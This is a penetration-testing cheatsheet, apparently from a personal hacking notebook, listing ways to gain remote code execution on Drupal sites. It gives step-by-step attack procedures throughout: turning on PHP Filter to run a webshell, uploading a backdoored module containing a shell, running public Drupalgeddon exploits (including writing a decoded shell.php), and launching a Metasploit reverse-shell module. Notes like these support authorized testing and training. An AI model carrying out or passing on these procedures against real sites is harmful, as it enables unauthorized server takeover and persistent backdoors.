# Cheatsheet

| ***Command***                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ***Usage***                                                                                                                                                                                              |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| As an admin, Go to `Module` -> look for `PHP Filter` and enable -> `Save configuration`.<br>Next. `Content` -> `Add content` -> `Basic Page`.<br><br>Add code for a webshell, then change format to `PHP Code` and save.<br>Visit the page for                                                                                                                                                                                                                         | RCE Procedure using `PHP-Filter` if Drupal version <8.                                                                                                                                                   |
| `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`<br><br>Upload to `Administration` > `Reports` > `Available updates`.<br><br>Then follow the steps for Drupal Version <8.                                                                                                                                                                                                                                                                               | RCE Procedure using `PHP-Filter` if Drupal version >8.<br><br>Note: Upload location may change.                                                                                                          |
| Install a module & extract. Example:<br>`wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`<br><br>Followed by`tar xvf captcha-8.x-1.2.tar.gz`<br><br>Write a webshell + `.htaccess` inside. See [Example `.htaccess` file](#Example%20`.htaccess`%20file)<br><br>Recompress: `tar cvf captcha.tar.gz captcha/`<br><br>Upload: `Manage` > `Extend` > `Install new Module`<br><br> Visit `/modules/<module-name>/shell.php`<br> | RCE Procedure using Backdoored module.                                                                                                                                                                   |
| [Exploit](https://www.exploit-db.com/exploits/34992)<br><br>Command: `python2.7 drupalgeddon.py`                                                                                                                                                                                                                                                                                                                                                                       | **Drupalgeddon 1**<br>Creating a new Admin user. Works for versions 7.0 - 7.31.                                                                                                                          |
| [Exploit](https://www.exploit-db.com/exploits/44448)<br><br>Run as is, then modify the `echo` payload within the script.<br><br>` echo "<b64>" \| base64 -d \| tee shell.php`                                                                                                                                                                                                                                                                                          | **Drupalgeddon 2**<br>RCE.                                                                                                                                                                               |
| `exploit/unix/webapp/drupal_drupalgeddon3`<br><br>Set `rhosts`,`VHOST`, `drupal_session`, `DRUPAL_NODE 1`, and `LHOST`.<br>                                                                                                                                                                                                                                                                                                                                            | **Drupalgeddon 3**<br>Generates Reverse shell using metasploit.<br><br>**requires a user to have the ability to delete a node.**<br><br>[Affected versions](https://www.drupal.org/sa-core-2018-004)<br> |

# Related pages
[Web Shells](II.%20Pre-Exploitation/Web%20Shells.md): Useful.
[Drupal Enumeration](I.%20Enumeration/Web%20Enumeration/Common%20WebApps/Drupal%20Enumeration.md): Enumerate before exploiting.
# Overview


### Example `.htaccess` file

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```